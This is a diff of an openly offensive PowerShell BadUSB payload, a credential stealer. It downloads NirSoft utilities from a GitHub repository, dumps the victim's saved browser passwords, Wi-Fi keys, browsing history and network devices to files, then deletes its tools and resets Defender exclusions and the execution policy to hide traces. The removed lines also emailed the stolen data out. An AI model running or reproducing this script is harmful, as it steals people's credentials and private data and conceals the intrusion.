@@ -1,22 +1,35 @@
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe #Download the nirsoft tool for Browserhistory
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe #Download the nirsoft tool for connected devces
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe #Download the nirsoft tool for WiFi passwords
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords
-.\WebBrowserPassView.exe /stext passwords.txt #Create the file for Browser passwords
-.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt #Create the file for Browser history
-.\WirelessKeyView.exe /stext wifi.txt #Create the file for WiFi passwords
-.\WNetWatcher.exe /stext connected_devices.txt #Create the file for connected devices
-Start-Sleep -Seconds 60 #Wait for 60 seconds (because connected devices file take a minute to be created)
-$SMTPInfo.Send($ReportEmail) #Send mail
-Start-Sleep -Seconds 15 #Wait 15 seconds
-#Delete nirsoft tools and .ps1 file
+# Download the Software
+Invoke-WebRequest https://github.com/Hacktivist2023/payloads/blob/master/tools/BrowsingHistoryView.exe -OutFile BrowsingHistoryView.exe
+Invoke-WebRequest https://github.com/Hacktivist2023/payloads/blob/master/tools/WNetWatcher.exe -OutFile WNetWatcher.exe
+Invoke-WebRequest https://github.com/Hacktivist2023/payloads/blob/master/tools/WirelessKeyView.exe -OutFile WirelessKeyView.exe
+Invoke-WebRequest https://github.com/Hacktivist2023/payloads/blob/master/tools/WebBrowserPassView.exe -OutFile WebBrowserPassView.exe 
+
+# Create the file for Browser passwords
+.\WebBrowserPassView.exe /stext passwords.txt
+# Create the file for Browser history
+.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt
+# Create the file for WiFi passwords
+.\WirelessKeyView.exe /stext wifi.txt
+# Create the file for connected devices
+.\WNetWatcher.exe /stext connected_devices.txt 
+
+# Wait for 60 seconds (because connected devices file take a minute to be created)
+Start-Sleep -Seconds 60
+
+# Delete nirsoft tools and .ps1 file
 Remove-Item BrowsingHistoryView.exe
 Remove-Item WNetWatcher.exe
 Remove-Item WNetWatcher.cfg
 Remove-Item WirelessKeyView.exe
 Remove-Item WebBrowserPassView.exe
 Remove-Item ciaoV2.ps1
-Remove-MpPreference -ExclusionExtension exe -Force #Reset antivirus exception
-Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
-Set-ExecutionPolicy restricted -Force #Reset script blocker
-exit #End .ps1 file
+
+# Reset antivirus exception
+Remove-MpPreference -ExclusionExtension exe -Force
+Remove-MpPreference -ExclusionExtension ps1 -Force
+
+# Reset script blocker
+Set-ExecutionPolicy restricted -Force
+
+# bye
+exit
